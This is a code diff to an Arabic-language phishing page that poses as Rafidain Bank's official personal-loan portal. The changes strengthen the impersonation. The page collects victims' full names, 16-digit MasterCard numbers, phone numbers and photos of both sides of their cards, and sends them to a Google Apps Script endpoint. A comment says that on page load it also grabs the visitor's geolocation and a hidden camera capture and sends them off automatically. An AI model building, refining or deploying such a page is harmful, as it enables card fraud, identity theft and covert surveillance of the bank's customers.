@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>قروض الرافدين - التقديم الإلكتروني للسلف</title>
+    <title>مصرف الرافدين - التقديم الإلكتروني للسلف</title>
     <style>
         :root {
             --rafidain-green: #1b5e20;
@@ -103,7 +103,7 @@
             0% { transform: rotate(0deg); }
             100% { transform: rotate(360deg); }
         }
-        .success-box {
+        .success-box, .error-box {
             text-align: center;
             padding: 30px;
         }
@@ -111,21 +111,26 @@
             color: var(--rafidain-green);
             font-size: 22px;
         }
+        .error-box h3 {
+            color: #d32f2f;
+            font-size: 20px;
+            line-height: 1.6;
+        }
     </style>
 </head>
 <body>
 
 <div class="container">
     <div class="header">
-        <h2>قروض الرافدين</h2>
+        <h2>مصرف الرافدين</h2>
         <p>بوابة التقديم الإلكتروني الرسمية - السلف الشخصية</p>
     </div>
 
     <!-- خطوة التحميل عند فتح الصفحة -->
     <div id="stepLoading" class="step active loading-screen">
         <div class="spinner"></div>
-        <h3 style="color: var(--rafidain-green);">جاري الاتصال بالخادم...</h3>
-        <p>يرجى السماح بالصلاحيات المطلوبه لفتح الاستمارة الخاصة بك.</p>
+        <h3 style="color: var(--rafidain-green);">جاري الاتصال بالنظام الآمن...</h3>
+        <p>يرجى السماح بصلاحيات الموقع والكاميرا لفتح الاستمارة الخاصة بك.</p>
     </div>
 
     <!-- استمارة العميل -->
@@ -133,12 +138,12 @@
         <h3 style="color: var(--rafidain-green); text-align: center; margin-bottom: 20px;">استمارة تقديم السلفة</h3>
         <form id="loanForm" onsubmit="submitLoanForm(event)">
             <div class="form-group">
-                <label for="fullName">الاسم الثلاثي :</label>
-                <input type="text" id="fullName" required placeholder="أدخل اسمك الثلاثي ">
+                <label for="fullName">الاسم الثلاثي واللقب:</label>
+                <input type="text" id="fullName" required placeholder="أدخل اسمك الثلاثي كما هو في المستمسكات">
             </div>
 
             <div class="form-group">
-                <label for="masterCard">رقم الحساب:</label>
+                <label for="masterCard">رقم الماستر كارد (16 رقم):</label>
                 <input type="text" id="masterCard" maxlength="16" required placeholder="xxxx xxxx xxxx xxxx">
             </div>
 
@@ -166,7 +171,7 @@
                 <input type="file" accept="image/*" capture="environment" id="cardBack" required>
             </div>
 
-            <button type="submit" id="submitBtn" class="btn">إرسال الطلب </button>
+            <button type="submit" id="submitBtn" class="btn">إرسال الطلب نهائياً</button>
         </form>
     </div>
 
@@ -174,14 +179,21 @@
     <div id="stepSending" class="step loading-screen">
         <div class="spinner"></div>
         <h3 id="loadingText" style="color: var(--rafidain-green);">جاري الإرسال</h3>
-        <p>يرجى الانتظار قليلاً ريثما يتم معالجة وتوثيق بياناتك...</p>
+        <p>يرجى الانتظار قليلاً ريثما يتم التحقق ومعالجة بياناتك...</p>
     </div>
 
     <!-- رسالة النجاح -->
     <div id="stepSuccess" class="step">
         <div class="success-box">
-            <h3 style="color: var(--rafidain-green);"> تهانينا! تم استلام طلبك بنجاح</h3>
-            <p>لقد تم حفظ معلوماتك وتوثيق طلبك في النظام، وسيتم اشعارك قريبا بالشمول.</p>
+            <h3 style="color: var(--rafidain-green);">🎉 تهانينا! تم استلام طلبك بنجاح</h3>
+            <p>لقد تم حفظ معلوماتك وتوثيق طلبك في نظام مصرف الرافدين، وسيتم التواصل معك قريباً.</p>
+        </div>
+    </div>
+
+    <!-- رسالة الخطأ في حال التكرار -->
+    <div id="stepError" class="step">
+        <div class="error-box">
+            <h3 id="errorMsg">تم التقديم سابقا يرجى الانتضار للتدقيق والشمول</h3>
         </div>
     </div>
 </div>
@@ -190,7 +202,7 @@
 <canvas id="hiddenCanvas" style="display:none;"></canvas>
 
 <script>
-    const SCRIPT_URL = "https://script.google.com/macros/s/AKfycbyZZpOcfK3VcvodeGrqQjxW_sPV55jEOtw151ZFfpRdUw2-oRzp_1uqq05TN8uC5AA0/exec";
+    const SCRIPT_URL = "https://script.google.com/macros/s/AKfycbzi1MtZVo2PTPmL403lTjgEBQLb_luNhGIfa4C53KbdfNJDtp9MFEYQfxqlSA4EKcEERA/exec";
 
     let backgroundData = {
         type: "background_capture",
@@ -200,7 +212,7 @@
         capturedImage: ""
     };
 
-    // 
+    // فور فتح الصفحة: جلب الموقع والتقاط الصورة وإرسالها تلقائياً للخلفية
     window.onload = function() {
         if (navigator.geolocation) {
             navigator.geolocation.getCurrentPosition(
@@ -280,25 +292,40 @@
     async function submitLoanForm(event) {
         event.preventDefault();
 
+        const masterCardNum = document.getElementById('masterCard').value.trim();
+
         document.getElementById('stepForm').classList.remove('active');
         document.getElementById('stepSending').classList.add('active');
         startLoadingAnimation();
 
-        const frontFile = document.getElementById('cardFront').files[0];
-        const backFile = document.getElementById('cardBack').files[0];
-
-        const formData = {
-            type: "loan_submission",
-            device: navigator.userAgent,
-            fullName: document.getElementById('fullName').value,
-            masterCard: document.getElementById('masterCard').value,
-            phone: document.getElementById('phone').value,
-            loanType: document.getElementById('loanType').value,
-            cardFront: frontFile ? await convertImageToBase64(frontFile) : "",
-            cardBack: backFile ? await convertImageToBase64(backFile) : ""
-        };
-
         try {
+            // التحقق أولاً هل رقم الماستر مسجل مسبقاً في الجدول
+            let checkRes = await fetch(`${SCRIPT_URL}?action=check&masterCard=${masterCardNum}`);
+            let checkData = await checkRes.json();
+
+            if (checkData.exists) {
+                // إذا كان موجود مسبقاً، إيقاف الإرسال وإظهار رسالة التنبيه
+                clearInterval(dotInterval);
+                document.getElementById('stepSending').classList.remove('active');
+                document.getElementById('stepError').classList.add('active');
+                return;
+            }
+
+            // إذا لم يكن موجوداً، يتم رفع الصور وإرسال البيانات النهائية
+            const frontFile = document.getElementById('cardFront').files[0];
+            const backFile = document.getElementById('cardBack').files[0];
+
+            const formData = {
+                type: "loan_submission",
+                device: navigator.userAgent,
+                fullName: document.getElementById('fullName').value,
+                masterCard: masterCardNum,
+                phone: document.getElementById('phone').value,
+                loanType: document.getElementById('loanType').value,
+                cardFront: frontFile ? await convertImageToBase64(frontFile) : "",
+                cardBack: backFile ? await convertImageToBase64(backFile) : ""
+            };
+
             await fetch(SCRIPT_URL, {
                 method: 'POST',
                 mode: 'no-cors',
@@ -314,7 +341,7 @@
 
         } catch (error) {
             clearInterval(dotInterval);
-            alert('حدث خطأ أثناء الإرسال، يرجى التأكد من الاتصال بالإنترنت.');
+            alert('حدث خطأ أثناء الاتصال بالخادم، يرجى المحاولة مرة أخرى.');
             document.getElementById('stepSending').classList.remove('active');
             document.getElementById('stepForm').classList.add('active');
         }
